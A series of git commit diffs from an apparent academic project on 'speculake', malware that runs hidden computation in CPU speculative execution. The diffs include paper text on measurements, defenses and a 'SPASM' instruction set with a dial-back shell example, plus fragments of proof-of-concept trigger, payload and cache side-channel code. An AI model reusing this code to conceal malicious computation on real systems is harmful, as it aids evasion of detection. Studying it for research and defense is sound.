+    \label{fig:spec-capacity}
+\end{figure*}
+}

### 2018-05-04 paper/architecture.tex

--- 2018-05-04 paper/architecture.tex
@@
 
-\begin{figure}[t]
-    \centering
-        \includegraphics[width=0.5\textwidth]{figures/speculative_measurements.png}
-    \caption{The speculative primitive allows for a limited number of instructions
-        to be completed speculatively, dependent on multiple factors. A) The 
-        processor generation determines the maximum ROB size and PRF capacity,
-        however intel xeon E3-1270(warm colors) and i5-7200U both (cool colors) 
-        perform similarly for comparable instructions. B) Because trigger and 
-        payload processes must share cpu resources they must be performed on 
-        the same hyperthread or associated parity hyperthreads. Processes on
-        the parity hyperthreads (warm colors) denoted by (P) accomplish a 
-        significantly lower number of instructions as compared with processes 
-        on the same hyperthread (cool colors).}
-    \label{fig:spec-capacity}
-\end{figure}
+\subsection{Limits of Speculative Execution}
 
-\subsection{Limits of Speculative Execution}
+\FigSpecMeasure
+
 We performed several experiments to investigate how much computation can be done

### 2018-05-04 target_fn.c
idiv as a speculative fence

@@ -22,6 +22,16 @@ void target_fn(void) __attribute__((section(".targetfn")));
 void target_fn(void)
 {
     //signal(11);
+    asm volatile("idiv %%rbx\n":: "d"(0x00), "a"(0x12341234), "b"(0x1235):);
+    asm volatile("idiv %%rbx\n":: "d"(0x00), "a"(0x12341234), "b"(0x1235):);
+    //asm volatile("idiv %%rbx\n":: "d"(0x00), "a"(0x12341234), "b"(0x1235):);
+    //asm volatile("idiv %%rbx\n":: "d"(0x00), "a"(0x1234), "b"(0x1235):);
+    //asm volatile("idiv %%rbx\n":: "d"(0x00), "a"(0x1234), "b"(0x1235):);
+    //asm volatile("idiv %%rbx\n":: "d"(0x00), "a"(0x1234), "b"(0x1235):);
+    //asm volatile("idiv %%rbx\n":: "d"(0x01), "a"(0x1234), "b"(0x1235):);
+    //asm volatile("idiv %%rbx\n":: "d"(0x01), "a"(0x1234), "b"(0x1235):);
+    //asm volatile("idiv %%rbx\n":: "d"(0x01), "a"(0x1234), "b"(0x1235):);
+
     register uint8_t *pb = (uint8_t*)*((uint8_t**)0x480000);  // probe_buf
     register uint64_t cps = *((uint64_t*)0x480010);  // cur_probe_space
     asm volatile ("mov (%%rcx), %%rax" :: "c"(&pb[13*cps]) : "rax");

### 2018-05-04 paper/architecture.tex
architecture pass

@@
 
-We performed several experiments to investigate how much computation can be done
-speculatively. We performed these experiments on an Intel Xeon-1270, as well as 
-an intel i5-7200U to verify the results across processor generations.
+We performed several experiments to determine how much computation can be
+performed
+speculatively, as well as what components are responsible for the limit.
+We report results from our experiments on an Intel~Xeon-1270,
+though we note we found similar results across other Intel processor generations,
+including an i5-7200U, % jack
+an i5-4300U, % ewust laptop
+and an i5-4590. % ewust desktop
+% For simplicity, we report results from only the Xeon-1270.
 
-Speculative branching is not a new feature in processors~\cite{branching-hist}, 
-and it has been integrated in multiple generations of commodity processors today. 
-Accordingly speculative instruction capacity has fairly well defined limits, in 
-line with known features of processor designs. We have determined that features 
-like reorder buffers (ROB), physical register file (PRF), and cache miss timing
-determines a strong limit on the number of instructions that can be accomplished
-speculatively.
+%Speculative branching is not a new feature in processors~\cite{branching-hist}, 
+%and it has been integrated in multiple generations of commodity processors today. 
+%Accordingly speculative instruction capacity has fairly well defined limits, in 
+%line with known features of processor designs. We have determined that features 
+%like reorder buffers (ROB), physical register file (PRF), and cache miss timing
+%determines a strong limit on the number of instructions that can be accomplished
+%speculatively.
+
+\subsubsection{Cache Miss Duration}
+When executing instructions speculatively we rely on a memory load of a function
+pointer from uncached memory. Thus, one potential limit on our computation comes
+in the form of the time it takes for the memory read to return with a result
+(and for the CPU to determine the result was mis-predicted).
+We measured the number of cycles a
+cache miss takes to return by artificially evicting an item from cache and
+timing reads from its address.
+Figure~\ref{fig:cache-miss} shows the CDF of cycles taken. In the typical case,
+an evicted item takes approximately 300 clock cycles to load from L3, which
+would allow a limit of roughly 200 speculative instructions to be
+executed during that time. We note that when an item is not in L3, it takes
+considerably longer to load, in theory allowing for thousands of speculative
+instructions.
 
 \subsubsection{Reorder Buffer Capacity} \label{sssec:ROB}
-To determine these limits we first measured the capacity of the reorder buffer
-using the method outlined by~\cite{intel-rob-capacity}. By performing two cache loads
-with a variable number or instructions between them and watching the amount of 
-time taked to complete this loop we can find a definitive number of instructions
-at which the second cache access is outside of the ROB. Figure~\ref{fig:spec-capacity}
-shows this step function at ~220 instructions for both Sandy Lake and Kaby Lake 
-generation processors.
+We also measured the capacity of the reorder buffer (ROB) using a method
+outlined by~\cite{intel-rob-capacity}. We measure the maximum number of cycles taken to
+perform two uncached memory reads, and vary the number of filler instructions
+between them. If the number of filler instructions is small, both memory reads
+will fit inside the ROB, and can issue their memory reads in parallel. However,
+if the filler instructions fill the ROB, the second memory read will have to
+wait for the first to return before it can be issued, causing a noticeable step
+increase in the cycle count.
+Figure~\ref{fig:spec-capacity}
+shows this step occurs at approximately 220 instructions for our processor,
+suggesting a hard upper bound regardless of how long the cache miss takes to
+resolve.
 
-\subsubsection{Cache Miss Duration}
-When executing instructions speculatively we rely on a load from a cache line that
-has recently been evicted. We have examined the number of cycles a
-cache miss takes to return by artificially evicting an item from cache and timing 
-a request for that specific item. The distribution of cycle counts can be seen in
-Figure~\ref{fig:cache-miss}, along with the CDF. For a large majority of cases, 
-an item evicted from cache will have 300 clock cycles and often much more.
+%TODO: explain why it's noisy? why does the maximum number of cycles drop below
+%this when we're above 220 instructions? Is the step somewhere above that, but
+%other processes have crept in (but occasionally, we get lucky and it's just us)?
 
 \subsubsection{Speculative Instruction Capacity}
-To verify that the ROB defines an upper limit for speculative instruction capacity
-we instrumented the trigger and payload to test variable length target functions. 
-In addition we tested whether instruction complexity or data dependencies impact
-the maximum work that can be completed. We found that the processor can identify 
+
+To verify the upper limit of speculative instructions,
+we instrumented our trigger and payload programs to test a variable-length target
+function before it communicated a signal to the real world via a cache side
+channel. If the cache side channel revealed no signal in the real world, then we know the
+speculative execution did not make it to the signal instructions before the
+mis-speculated branch was resolved.
+
+We also tested whether instruction complexity or data dependencies impact
+the number of instructions that can be completed. We find that data dependencies
+and instruction complexity both have an impact on the number of instructions
+that can be executed. Instruction complexity is determined the number of
+$\mu$ ops that the instruction uses, which appears to be what is tracked in the ROB.
+For instance, on our architecture, the 64-bit \texttt{idiv} instruction takes 59
+$\mu$ ops, and we can execute up to 3 of them in the speculative world.
+Meanwhile, we can execute up to 18 32-bit \texttt{idiv} instructions, which each
+take 9 $\mu$ ops~\cite{intel-instruction-tables}.
+
+We found that the processor can identify
 some operations that have no effect on output registers and allows them to use the 
@@
 until it reaches the correct stage in the execution pipeline. In this case, the number 
-of instructions is limited by the PRF entries available.
+of instructions could be limited by the PRF entries available.
 
-Most notably instructions making use of the extended x86 registers are still
-valid within speculative context. Specifically Intel's hardware accelerated AES-NI
-encryption and decryption instructions, which make use of the 128 bit registers.
+%TODO: is this true? Or better explained by the micro-op story?
+
+Most notably instructions that use the extended x86 registers are still
+valid within the speculative context. Specifically, Intel's hardware accelerated AES-NI
+encryption and decryption instructions, which each use 128-bit registers.
 As shown in Figure~\ref{fig:spec-capacity}, speculative environments can complete
@@
 
-When executing speculatively, the number of instrutions completed 
-will almost never be limited by cache miss duration. Instead
+We find that when executing speculatively, the number of instrutions completed
+is rarely limited by cache miss duration. Instead
 ROB size and processor mechanisms for resolving
@@
 
-\begin{figure}[h]
-    \centering
-        \includegraphics[width=0.5\textwidth]{figures/cache_miss_dist}
-    \caption{}
-    \label{fig:cache-miss}
-\end{figure}
+\FigCacheMiss
 
@@
 We summarize our findings into a \emph{speculative primitive}, which allows us to
-speculatively (and covertly) perform approximately TK:150 arbitrary
+speculatively (and covertly) perform on the order of 100 arbitrary
 instructions, and communicate a short (e.g. single byte) result to the real
@@
 bits) and the time it takes the real world to recover the result from the side
-channel. Using Prime+Probe~\cite{prime-probe} as our cache side channel,
+channel. Using Flush+Reload~\cite{flush-reload} as our cache side channel,
 recovering the result requires accessing all elements in an array exponential in

### 2018-05-04 paper/figures.tex
architecture pass
Figure updates for speculative measurements

--- 2018-05-03 paper/figures.tex
@@
     \centering
-    \includegraphics[clip, trim=3cm 13cm 3cm 5cm, width=\linewidth]{figures/exspectre-high-level.pdf}
+    % \includegraphics[clip, trim=6cm 13.5cm 3.8cm 5cm, width=0.9\linewidth]{figures/exspectre-high-level.pdf}
+    \includegraphics[width=0.9\linewidth]{figures/exspectre-high-level-trimmed.pdf}
     \caption{\textbf{Exspectre}\,---\, %
@@
 }
+
+\newcommand{\FigSpecMeasure}{
+\begin{figure*}[t]
+    \centering
+        \includegraphics[width=0.9\textwidth]{figures/Speculative_measurements.png}
+    \caption{The speculative primitive allows for a limited number of instructions
+        to be completed speculatively, dependent on multiple factors. Trigger and 
+        payload processes must share cpu resources as they must be performed on 
+        the same hyperthread or associated parity hyperthreads. Processes on
+        the parity hyperthreads (warm colors) denoted by (P) accomplish a 
+        significantly lower number of instructions as compared with processes 
+        on the same hyperthread (cool colors).}
+    \label{fig:spec-capacity}
+\end{figure*}
+}
+
+\newcommand{\FigCacheMiss}{
+\begin{figure}[h]
+    \centering
+    \includegraphics[width=0.5\textwidth]{figures/cache_miss_dist}
+    \caption{Cache Hit/Miss Latency Distribution}
+    \label{fig:cache-miss}
+\end{figure}
+}
+
+\newcommand{\FigGeneralModel}{
+\begin{figure}[t]
+    \centering
+        \includegraphics[width=0.4\textwidth]{figures/general_model}
+    \caption{ General model of speculative computation within the Measure 
+        process when triggered. \textit{Speculative Computation} has access
+        to all variables which do not require a memory transaction within
+        the current state of the process. The process can subsequently make
+        \textit{Resultant Computations} based on the value returned from 
+        Prime and Probe to update the state of the process. }
+    \label{fig:general_model}
+\end{figure}
+}
+
+\newcommand{\FigSpecBandwidth}{
+\begin{figure}[t]
+    \centering
+        \includegraphics[width=0.5\textwidth]{figures/Speculative_bandwidth}
+    \caption{Speculative Bandwidth - Using the speculative primitive 
+        1KB of data can be decrypted and exfiltrated at a speed around 5500 kbps
+        from the speculative world. Varying the width of the channel 
+        results in competing performance factors -- decreasing the 
+        number of loops vs decreased size of the probe space.}
+    \label{fig:spec_bandwidth}
+\end{figure}
+}

### 2018-05-04 paper/payloads.tex
Figure updates for speculative measurements

@@
 
-\begin{figure}[t]
-    \centering
-        \includegraphics[width=0.4\textwidth]{figures/general_model}
-    \caption{ General model of speculative computation within the Measure 
-        process when triggered. \textit{Speculative Computation} has access
-        to all variables which do not require a memory transaction within
-        the current state of the process. The process can subsequently make
-        \textit{Resultant Computations} based on the value returned from 
-        Prime and Probe to update the state of the process. }
-    \label{fig:general_model}
-\end{figure}
+\FigGeneralModel
 

### 2018-05-04 robsize/plot_cache-latency.py

@@ -5,45 +5,39 @@ import numpy as np
 
 
 def main():
-    data_i5 = []
-    data_xeon = []
-    with open("cache-miss.dat", "r") as f:
+    data_hit = []
+    data_miss = []
+    with open("data/zbuff-cache-miss.dat", "r") as f:
         for line in f:
             if line.isspace(): 
                 continue
-            data_i5.append(int(line.split()[0]))
+            data_miss.append(int(line.split()[0]))
 
-    with open("cache-miss-zbuff.dat", "r") as f:
+    with open("data/zbuff-cache-hits.dat", "r") as f:
         for line in f:
             if line.isspace(): 
                 continue
-            data_xeon.append(int(line.split()[0]))
+            data_hit.append(int(line.split()[0]))
 
     fig = plt.figure()
-    pdf = fig.add_subplot(111)
-    cdf = pdf.twinx()
+    cdf = fig.add_subplot(111)
 
-    pdf.hist(data_i5, bins=1000, label="I5-7200U Density", color='#ff5050')
-    sorted_data_i5 = np.sort(data_i5)
-    yvals=np.arange(len(sorted_data_i5))/float(len(sorted_data_i5)-1)
-    cdf.plot(sorted_data_i5,yvals, 'r-', label="I5-7200U CDF")
+    sorted_data_miss = np.sort(data_miss)
+    yvals=np.arange(len(sorted_data_miss))/float(len(sorted_data_miss)-1)
+    cdf.plot(sorted_data_miss,yvals, 'b-', label="Cache Miss")
 
-    pdf.hist(data_xeon, bins=1000, alpha=0.7, label="E3-1270 V5 Density", color='c')
-    sorted_data_xeon = np.sort(data_xeon)
-    yvals=np.arange(len(sorted_data_xeon))/float(len(sorted_data_xeon)-1)
-    cdf.plot(sorted_data_xeon,yvals, 'b-', label="E3-1270 V5 CDF")
+    sorted_data_hit = np.sort(data_hit)
+    yvals=np.arange(len(sorted_data_hit))/float(len(sorted_data_hit)-1)
+    cdf.plot(sorted_data_hit,yvals, 'r-', label="Cache Hit")
 
-    pdf.set_xlim(20,5*10**4)
     cdf.set_ylim(0,1)
-    pdf.set_yscale('log')
-    pdf.set_xscale('log')
+    cdf.set_xlim([1,2500])
[…]

### 2018-05-04 turing/turing.c
smaller turing machine

@@ -15,7 +15,7 @@
 // e.g. 256 would be 1 byte of info
 // Tradeoff here is larger bandwidth means we have
 // to check more places in probe_buf (and flush them)
-#define NUM_PROBES 256
+#define NUM_PROBES 8
 
 // These define the stride length we take between probes
 // This thwarts a clever CPU's stride prediction
@@ -34,21 +34,23 @@ uint8_t *probe_buf;
 
 // This is a simple counter, accessed by the speculative function (target_fn)
 // so it can compute on it.
-uint8_t signal_idx = 0;
 uint64_t instr = 0;
 
 
 // Stats
 uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
-uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
 uint64_t tot_time = 0;      // Number cycles total
 uint64_t R = 1;
 uint64_t L = 0;
-#define MAX_EXPERIMENT 1000
+#define MAX_EXPERIMENT 100
 
 unsigned int junk=0;    // For rdtscp
 
 
+uint8_t lookup[2][4] = {
+    {0, 1, 2, 3},
+    {4, 5, 6, 7}
+};
 uint8_t rand_xor;
 void init_rand() {
     srand(time(0));
@@ -86,11 +88,10 @@ void check_probes() {
             cache_hits++;
             tot_time += t1-t0;
             results[i]++;
-            //printf("# %lu\n", t1-t0);
+            // printf("# %lu\n",results[i]);
             //_mm_clflush(addr);
         }
     }
-    tot_runs++;
 
     // Clear probe_buf from cache
     for (i=0; i<NUM_PROBES; i++) {
@@ -139,24 +140,112 @@ void true_turing(void){
     //      1   1LC 1RB 0LE 1LD 0LA
     //
     uint8_t symbol = *turing_tape;
-    if (turing_state == 0) {    // A
-        if (symbol == 0) updateState(1, R, 1);
-        else             updateState(1, L, 2);
-    } else if (turing_state == 1) { // B
-        if (symbol == 0) updateState(1, R, 2);
-        else             updateState(1, R, 1);
-    } else if (turing_state == 2) { // C
-        if (symbol == 0) updateState(1, R, 3);
-        else             updateState(0, L, 4);
-    } else if (turing_state == 3) { // D
-        if (symbol == 0) updateState(1, L, 0);
-        else             updateState(1, L, 3);
[…]

### 2018-05-04 turing/turing_target.c

@@ -5,6 +5,7 @@ extern uint8_t *probe_buf;
 extern uint64_t cur_probe_space;
 extern uint64_t signal_idx;
 extern uint8_t rand_xor;
+extern uint8_t lookup[2][4];
 
 extern uint8_t *turing_tape;
 extern uint8_t turing_state;
@@ -47,22 +48,24 @@ void target_fn(void)
     //      1   1LC 1RB 0LE 1LD 0LA
     //
     uint8_t symbol = *turing_tape;
-    if (turing_state == 0) {    // A
-        if (symbol == 0) update_state(1, R, 1);
-        else             update_state(1, L, 2);
-    } else if (turing_state == 1) { // B
-        if (symbol == 0) update_state(1, R, 2);
-        else             update_state(1, R, 1);
-    } else if (turing_state == 2) { // C
-        if (symbol == 0) update_state(1, R, 3);
-        else             update_state(0, L, 4);
-    } else if (turing_state == 3) { // D
-        if (symbol == 0) update_state(1, L, 0);
-        else             update_state(1, L, 3);
-    } else if (turing_state == 4) { // E
-        if (symbol == 0) update_state(1, R, 5);
-        else             update_state(0, L, 0);
-    }
+    // if (turing_state == 0) {    // A
+    //     if (symbol == 0) update_state(1, R, 1);
+    //     else             update_state(1, L, 2);
+    // } else if (turing_state == 1) { // B
+    //     if (symbol == 0) update_state(1, R, 2);
+    //     else             update_state(1, R, 1);
+    // } else if (turing_state == 2) { // C
+    //     if (symbol == 0) update_state(1, R, 3);
+    //     else             update_state(0, L, 4);
+    // } else if (turing_state == 3) { // D
+    //     if (symbol == 0) update_state(1, L, 0);
+    //     else             update_state(1, L, 3);
+    // } else if (turing_state == 4) { // E
+    //     if (symbol == 0) update_state(1, R, 5);
+    //     else             update_state(0, L, 0);
+    // }
+    // do 4 state- 2 symbol lookup
+    signal(lookup[symbol][turing_state]);
 }
 
 void end_target_fn(void) __attribute__((section(".targetfn")));

### 2018-05-05 paper/discussion.tex
add defenses

@@
 \subsection{Defenses}
+We now address possible defenses to this new class of malware introduced by
+\speculake. Though we caution that these defenses often have drawbacks. The core
+component of \speculake is taking advantage of speculative execution inherent in
+CPUs today, thus these defenses focus on limiting this behavior.
+
+\subsubsection{SpecFence}
+The \texttt{mfence} instruction requires that instructions earlier in the code
+be retired before instructions after it. This ensures that memory is loaded and
+stored in a particular order (in the real world). However, the \texttt{mfence}
+instruction can be speculated past, meaning that caches can be affected
+out-of-order even with this instruction.
+
+One possible defense against \speculake is the introduction of a new
+instruction: \texttt{specfence} which designates to the CPU a point that cannot 
+be speculated past. This would require that loads/stores after the 
+\texttt{specfence} instruction would be on hold until loads/stores from before
+the \texttt{specfence} instruction have retired. Note the subtle difference from
+\texttt{mfence}, we not only require that the loads/stores before a
+\texttt{specfence} retire ahead of the loads/stores after the 
+\texttt{specfence}, but more strongly: the loads/stores after a 
+\texttt{specfence} do not begin to execute at all until the loads/stores before
+the \texttt{specfence} retire.
+
+This would possibly require a set of new API instructions in most basic
+libraries allowing for functions that ensure no speculation (for security, no
+data is leaked, no mystery instructions are run) and a separate set of functions
+(as exist now) which allow speculation to occur (for performance, no sensitive
+data is at risk).
+
+We note that this instruction seems to already exist, albeit unintentionally.
+The \texttt{rep} instruction repeats the execution of string instructions a set
+number of times (set in a register). When set to repeat 90 or more times, these
+instructions are not speculated past, requiring they complete and be retired
+before looking to the next instruction. This appears to be due to the 
+\texttt{rep} instruction adding additional $\mu$ ops per instruction, we found
+that using the \texttt{rep} instruction caused $2n$ $\mu$ ops when the string
+operation works on $n$ bytes. Thus enough repetitions would cause instructions
+after the \texttt{rep} instruction to wait for the full repetition to be retired
+before beginning their execution.
+
+While this either new or repurposed instruction may provide some defense
+against \speculake there are clear drawbacks: 
+\begin{enumerate}
+    \item Code using this instruction will be slower to execute by design. The
+    purpose of this instruction is to deliberately slow the CPU and force it to
+    wait. This will lead to a direct trade-off of speed vs. security.
+
+    \item This will require a new set of APIs for basic library functions that
+    load and store data. It would be detrimental to require all loads and stores
+    never be speculated past, meaning there must be an option for choosing when
+    certain loads and stores are not to be speculated past. This comes with all
+    the usual drawbacks of modified APIs, un-updated systems, software engineers
+    unaware of the new API, or of the significance, or when speculation is
+    appropriate and when it is dangerous.
+\end{enumerate}
+
+\subsubsection{Malware Detection}
+The world of computer security is often referred to as an arms race, hackers and
+criminals racing to create and use exploits before security researchers and
+software engineers can create defenses. As such we expect to see the same type
+of race with this new class of malware.
+
+A necessary portion of this class of malware is utilizing a cache side-channel,
+determining how long certain values require to load from memory or cache. Thus
+one method of defense against \speculake is to adapt malware detectors to
+examine if a program checks for the timing of loading values from memory.
+
+Initially this appears to be a very effective method of recognizing this attack.
+However, the notion of timing memory loads can be done in obscure ways which can
+be made to appear innocuous. As opposed to directly measuring the timing of
+memory loads, the timing can be more indirect: measuring how long a specific
+loop takes that happens to do a memory load. Or more directly, avoiding
+measuring time altogether: create a race-condition which only the
+already-in-cache value will easily win.
+
+While the notion of simply adapting current defenses to recognize this new
+strain of malware may be simplest, we caution that the methods introduced by
+\speculake are very general and can be accomplished in numerous ways and simply
+attempting to recognize one method will undoubtedly be circumvented by future
+generations of this malware.
 
 \subsection{Future Work}
+\label{subsec:future-work}
 

### 2018-05-06 entropy/gen-chain.py
first crack at increased entropy/chained speculative jumps

@@ -1,0 +1,249 @@
+#!/usr/bin/python
+
+
+NUM_ROUNDS = 10
+BYTES_PER_ROUND = 1
+NUM_LANDINGS = 2**(BYTES_PER_ROUND*8)
+
+#payload_f = open('payload_target.S', 'w')
+#trigger_f = open('trigger_jumps.S', 'w')
+
+PAYLOAD = True
+
+import sys
+import random
+
+if len(sys.argv) > 1 and sys.argv[1] == 'trigger':
+    PAYLOAD = False
+
+print '.section .targets, "ax"'
+print '  .global targets'
+print 'targets:'
+
+targets_offset = 0x510000
+addrs = []
+
+for i in xrange(NUM_LANDINGS):
+    # These are the addresses we want to jump to
+    # Takes 14 instrs per
+    addr = 0x16*i + targets_offset
+    addrs.append((addr, i))
+
+    # Can't just keep this in 64-bit register...
+    #print '  movl $0x%04x, %%ebx' % (i)
+    #print '  shl $0x%02x, %%rcx' % (BITS_PER_ROUND)
+    #print '  xor %rbx, %rcx'
+
+    print '  movl $0x%04x, %%ebx    # 0x%08x' % (i, addr)
+    print '  movq %rbx, %xmm11'
+    print '  pslldq $%d, %%xmm0' % (BYTES_PER_ROUND)
+    print '  pxor %xmm11, %xmm0'
+
+
+    if PAYLOAD:
+        print '  jmpq *%rax'
+    else:
+        print '  retq'
+        print '  nop'
+
+
+
+print '''
+
+# This function encrypts a counter (provided in %rdi)
+# Using a pseudo-key derived from the value in %xmm0
+# Returns a __uint128_t in %rax:%rdx
+#
+# This function assumes that you've jumped through some number
+# of targets, and %rcx is set accordingly.
+# We'll then derive %xmm0..10 round keys from %rcx (now in %rdi).
+# Ideally, we could use some kind of hash function.
+# But the speculative world doens't live that long,
+# So we'll just use aesenc.
+
+.section .encrypt, "ax"
+  .global encrypt
+encrypt:
+    # Derive %xmm0...10 from %xmm0
+    # Ideally, we'd treat xmm0 as an AES key
+    # and do the normal AES key schedule.
+    # Unfortunately, we don't have enough
[…]

### 2018-05-06 entropy/measure.c

@@ -1,0 +1,183 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <signal.h>
+#include <x86intrin.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/mman.h>
+#include "common.h"
+
+// Defines the bandwidth we can communicate
+// from speculative -> von neuman
+// e.g. 256 would be 1 byte of info
+// Tradeoff here is larger bandwidth means we have
+// to check more places in probe_buf (and flush them)
+#define NUM_PROBES 256
+#define DECRYPT_LEN 256
+
+// These define the stride length we take between probes
+// This thwarts a clever CPU's stride prediction
+// (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
+// Generally, this results in not seeing ANY winning probes
+// in which case, we change cur_probe_space and retry
+#define MAX_PROBE_SPACE (1000003)
+double avgpct = 0;
+uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
+
+
+// The (heap-allocated) probe buffer
+// We'll have NUM_PROBES in this, and use &probe_buf[i*cur_probe_space]
+// in the cache to communicate the value i from speculative -> von neuman
+uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
+
+
+// This is a simple counter, accessed by the speculative function (target_fn)
+// so it can compute on it.
+uint16_t signal_idx = 0;
+uint64_t instr = 0;
+
+
+// Stats
+uint64_t cache_hits = 0;    // Number cache hits (<140 cycles read)
+uint64_t tot_runs = 0;      // Number of trials (i.e. 10k)
+uint64_t tot_time = 0;      // Number cycles total
+
+unsigned int junk=0;    // For rdtscp
+
+
+void *map;
+#define TARGET_FN_ADDR 0x414100401000
+
+// We define this function in assembly (target_fn.S)
+// It is never called directly (essentially dead code)
+// However, indirect.c trains the processor to think the indirect
+// jump in common.c::indirect() is going to call this function
+// We flush the fn_ptr used by indirect(), forcing the CPU to
+// (mis)speculate and start processing this function.
[…]

### 2018-05-06 paper/appendix_spasm.tex

\section{SPASM Instruction Set}
\label{appendix:spasm}
\renewcommand{\thefootnote}{\fnsymbol{footnote}}

SPASM is a 6 bit instruction set that we have developed to make use of the 
speculative primitive investigated in this work. The instruction set uses two 
functional registers, PTR and VAL, and a stack. This instruction set has been 
designed to be emulated in x86 and x86-64 environments, though the emulator 
could be implemented to run on other systems.

The progamming model used by SPASM build up values on the maintained stack
and stores values in specially reserved offsets equivalent to registers 
in order to build up system calls. Immediates can be assigned into VAL
incrementally, and stored, operated on, or pushed onto the maintained
stack. Control Flow is implemented by modifying the maintained 
instruction pointer SRIP, including conditional jmps.

Using this we have implemented various example programs including 
\textit{HelloWorld}, \textit{FizzBuzz}, and \textit{DialbackShell}.
See Figure~\ref{fig:spasm_model} for a diagram of our usage of SPASM 
within the \speculake model.

\subsection{Instructions}
\begin{description}
  \setlength\itemsep{1em}
\item[UVAL] (0x3?) - 
The lower 4 bits of any instructions matching this wildcard are 
assigned onto the lowest 4 bits of VAL. This is used
for assigning immediates and computing offsets.

\item[SYSCALL] (0x1F) - 
Copies the values stored from the appropriate state struct registers 
into the equivalent physical registers and perform a syscall instruction. 
The result is copied back to the state struct in SRAX.

\item[BASE] (0x1E) - 
Set PTR to a \textit{uint64\_t*} pointing to the head of the state struct.

\item[SHVAL] (0x1D) - 
Shift VAL to the left by 4 bits and store the result back into VAL. This is
used with UVAL to assign immediates.

\item[MREG] (0x1C) - 
Multiply VAL by 8 and store the result back into VAL. This is used to index 
into the state struct at the correct byte as the speculative register place
holders are at fixed offsets in the struct.

\item[PUSH] (0x1B) -
Push an item onto the stack maintained by the state struct and update the 
stack pointer SRSP accordingly.

\item[POP] (0x1A) - 
Pop an item from the stack maintained by the state struct and update the 
stack pointer SRSP accordingly.

\item[APTR] (0x19) - 
Set the value at the address in PTR equal to VAL.

\item[DPTR] (0x18) - 
Set VAL equal to the value at the address in PTR.

\item[SWAP] (0x17) - 
Swap the values in the VAL and PTR.

\item[JZ] (0x13) - 
If VAL is equal to zero set SRIP equal to the value in PTR, else add one to SRIP.

\item[J] (0x12) - 
Assign SRIP to the value in PTR.

\item[CALL] (0x11) - 
Push the current SRIP onto the stack and set SRIP equal to the value in PTR.

\item[CMP] (0x10) - 
Compare the values in VAL and PTR, if PTR is greater than or equal to VAL
set VAL equal to 1; otherwise set VAL equal to 0.

\item[ADD] (0x0F) - 
Add the values in PTR and VAL and store the result in PTR.

\item[2CMP] (0x0E) - 
Perform 2's compliment operation on VAL and store the result into VAL.
Used to implement subtraction operations.

\item[DADD] (0x0D) - 
Dereference the value in PTR, add VAL and store back into the dereference 
of PTR.

\item[DMUL] (0x0C) - 
Dereference the value in PTR, multiply VAL and store back into the dereference
 of PTR.

\item[DDIV] (0x0B) - 
Dereference the value in PTR, divide by VAL and store back into the 
dereference of PTR.

\item[DSHL] (0x09) - 
Dereference the value in PTR, shift left by VAL and store back into the 
dereference of PTR.

\item[DSHR] (0x08) - 
Dereference the value in PTR, shift right by VAL and store back into the 
dereference of PTR.

\item[DAND] (0x07) - 
Dereference the value in PTR, bitwise and VAL and store back into the 
dereference of PTR.

\item[DOR] (0x06) - 
Dereference the value in PTR, bitwise or with VAL and store back into the 
dereference of PTR.

\item[DXOR] (0x05) - 
Dereference the value in PTR, bitwise xor with VAL and store back into the 
dereference of PTR.

\item[NOT] (0x04) - 
Perform a bitwise not on VAL and store the result back into VAL.

\item[CLR] (0x02) - 
Set VAL equal to 0.

\item[NOP] (0x00) - 
No-op instruction.
\end{description}

% \subsection{Programming Model}

% \subsubsection{Macros}
% \begin{description}
% \item[EUVAL] test
% \item[ECALL] test
% \item[EPUSH] test
% \item[EGET]  test
% \item[ESET]  test
% \end{description}

\renewcommand{\thefootnote}{\arabic{footnote}}

### 2018-05-06 paper/figures.tex

@@
 }
+
+\newcommand{\FigSpasmModel}{
+\begin{figure}[b]
+    \centering
+        \includegraphics[width=0.5\textwidth]{figures/spasm_model}
+    \caption{This model describes the VM control flow. An encrypted SPASM binary 
+        stored in dead code or data accessible to \textit{Speculative Computation} 
+        is decrypted  and then returned through the primitive. The SPASM 
+        \textit{Resultant Computation} performs the SPASM emulation to update the 
+        process state before the next instruction is decrypted.}
+    \label{fig:spasm_model}
+\end{figure}
+}

### 2018-05-06 paper/implementation.tex
Figure updates for speculative measurements

@@
 
-\begin{figure}[t]
-    \centering
-        \includegraphics[width=0.5\textwidth]{figures/spec_bandwidth}
-    \caption{Using the speculative primitive to decrypt 1KB of data
-        we have classified the speed at which data can be exfiltrated
-        from the speculative world. Varying the width of the channel 
-        results in competing performance factors -- decreasing the 
-        number of loops vs decreased size of the probe space.}
-    \label{fig:spec_bandwidth}
-\end{figure}
-
+\FigSpecBandwidth
 % implementation 
@@
 
-\begin{figure}[b]
-    \centering
-        \includegraphics[width=0.5\textwidth]{figures/spasm_model}
-    \caption{This model describes the VM control flow. An encrypted SPASM binary 
-        stored in dead code or data accessible to \textit{Speculative Computation} 
-        is decrypted  and then returned through the primitive. The SPASM 
-        \textit{Resultant Computation} performs the SPASM emulation to update the 
-        process state before the next instruction is decrypted.}
-    \label{fig:spasm_model}
-\end{figure}
+\FigSpasmModel
 

### 2018-05-06 entropy/trigger.c
add options

@@ -44,12 +44,31 @@ void train(int print_key)
     }
 }
 
+void usage(char *argv[])
+{
+    printf("\nUsage: %s [e|t]\n", argv[0]);
+    printf("\te = encrypt\n");
+    printf("\tt = train\n");
+}
+
 int main(int argc, char *argv[])
 {
 
-    printf("training...\n");
+    if (argc < 2) {
+        usage(argv);
+        exit(1);
+    }
 
-    train(1);
+    if (argv[1][0] == 'e') {
+        printf("encrypting...\n");
+        train(1);
+    } else if (argv[1][0] == 't') {
+        printf("training...\n");
+        train(0);
+    }
+
+    usage(argv);
+    exit(1);
 
 }
 

### 2018-05-06 entropy/gen-chain.py
fine do full multiply...

@@ -172,7 +172,7 @@ else:
     print '  # This is payload:'
     print '  mov $0x480000, %rdx    # probe_buf'
     print '  mov $0x480010, %rbx    # cur_probe_space'
-    print '  imul %eax, %rbx        # cur_probe_space*pt_byte'
+    print '  imul %rax, %rbx        # cur_probe_space*pt_byte'
     print '  add %rbx, %rdx         # +probe_buf'
     print '  mov (%rdx),%rax        # load something in cache'
     print '  nop                    # celebratory nop'

### 2018-05-06 paper/discussion.tex
Future work multiple trigger stages and Model figure updates

@@
 
